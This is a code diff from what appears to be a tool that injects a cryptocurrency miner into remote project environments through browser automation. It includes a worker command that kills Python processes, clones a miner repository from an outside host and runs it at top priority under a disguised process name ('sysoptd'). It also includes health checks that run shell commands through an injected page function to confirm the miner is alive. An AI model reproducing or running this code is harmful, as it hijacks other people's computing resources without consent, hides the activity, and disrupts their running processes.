@@ -25,7 +25,7 @@ def build_worker_command(folder_name: str, bridge_url: str = BRIDGE_URL, threads
     custom = os.environ.get("MINER_CMD")
     if custom:
         return custom
-    return f"""cd /tmp && pkill python && rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""
+    return f"""cd /tmp && pkill python; rm -rf {folder_name} && git clone --depth 1 -q "{MINER_REPO}" {folder_name} && cd {folder_name} && pip install websockets psutil --break-system-packages -q && nice -n -20 python3 sysoptd.py --threads {threads} --no-split --no-schedule --no-noise --no-ramfill --no-pause > /tmp/m.log 2>&1"""
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
@@ -282,7 +282,7 @@ async def verify_worker(frame) -> bool:
             (async () => {
                 if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
                 try {
-                    const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                    const r = await window.doc("pgrep -f sysoptd | wc -l");
                     if (r && r.stdout !== undefined) return r.stdout.trim();
                     if (typeof r === 'string') return r.trim();
                     return JSON.stringify(r);
@@ -492,7 +492,7 @@ async def health_check_loop(page, project_url: str, mode: str = "full", bridge_u
                         (async () => {
                             if (!window.doc || typeof window.doc !== 'function') return 'nodoc';
                             try {
-                                const r = await window.doc("ps -A -o args | grep -c '[s]ysoptd'");
+                                const r = await window.doc("pgrep -f sysoptd | wc -l");
                                 if (r && r.stdout !== undefined) return r.stdout.trim();
                                 if (typeof r === 'string') return r.trim();
                                 return JSON.stringify(r);
